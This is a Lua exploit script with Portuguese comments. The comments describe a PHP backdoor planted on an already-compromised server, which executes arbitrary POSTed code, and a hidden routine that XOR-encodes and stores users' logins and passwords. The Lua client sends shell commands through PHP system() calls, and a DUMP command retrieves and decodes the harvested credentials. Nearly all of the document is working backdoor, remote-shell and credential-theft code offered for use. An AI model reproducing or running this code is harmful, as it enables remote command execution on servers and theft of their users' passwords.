-- Exploit basico LUA para execução de comandos na shell e acesso a senhas salvas de um serviço infectado previamente.
-- Setembro de 2011
--
-- Depois de conseguir acesso ao PHP do sistema do alvo, foi adicionado a uma interface de envio de raltórios o código seguinte:
-- 
-- +if($_POST['filename']) {
-- +    $filename = $_POST['filename'];
-- +    if(get_magic_quotes_gpc())
-- +        $filename = stripslashes($filename);
-- +    $fp=fopen('data/upload.db.php','w');
-- +    fwrite($fp,"$filename");
-- +    fclose($fp);
-- +    require('data/upload.db.php');
-- +    unlink('data/upload.db.php');
-- +    die();
-- +}
-- 
-- Inserindo em um arquivo php o conteudo, requerindo-o(o que resulta em um comando executado), e removendo-o.
-- Tambem foi criado um método para armazenar as senhas e logins dos usuarios através de um simples xor, conforme código a seguir:
-- 
-- +    if($password) {
-- +        $ent = "$username:$password";
-- +        $entry = "";
-- +        for($i = 0; $i < strlen($ent); $i++)
-- +            $entry .= chr(ord($ent[$i]) ^ 38);
-- +        $fp = fopen("data/news.db.php", "a");
-- +        fwrite($fp, base64_encode($entry)."\n");
-- +        fclose($fp);
-- +    }
-- 
-- A exploração do sistema ficou a cargo do script a seguir

require 'socket.http'
require 'cgilua.urlcode'
require 'bit'

function b64dec(data)
  b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  data = string.gsub(data, '[^'..b..'=]', '')
  return (data:gsub('.', function(x)
    if (x == '=') then return '00' end
    local r,f='',(b:find(x)-1)
    for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
    return r;
  end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
    if (#x ~= 8) then return '' end
    local c=0
    for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
    return string.char(c)
  end))
end

url = "http://infected-server/"
cmd = "uname -a"
function crypto(x)
  y=''
  for i=1,string.len(b64dec(x)) do y=y..string.char(bit.bxor(string.byte(b64dec(x),i),38)) end
  return y
end

function trata(dad0)
  if dad0 == "DUMP" then return {1,"<?php echo file_get_contents('data/news.db.php'); ?>"} end
  return {0,"<?php system('"..dad0.."') ?>"}
end

while cmd ~= "BYE" do
  data = cgilua.urlcode.encodetable({filename = trata(cmd)[2]})
  resposta = socket.http.request(url, data)
  if trata(cmd)[1] == 1 then

	for conta in resposta:gmatch("[^\n]+") do print(crypto(conta)) end
  else
    print(resposta)
  end
  cmd = io.read()
end
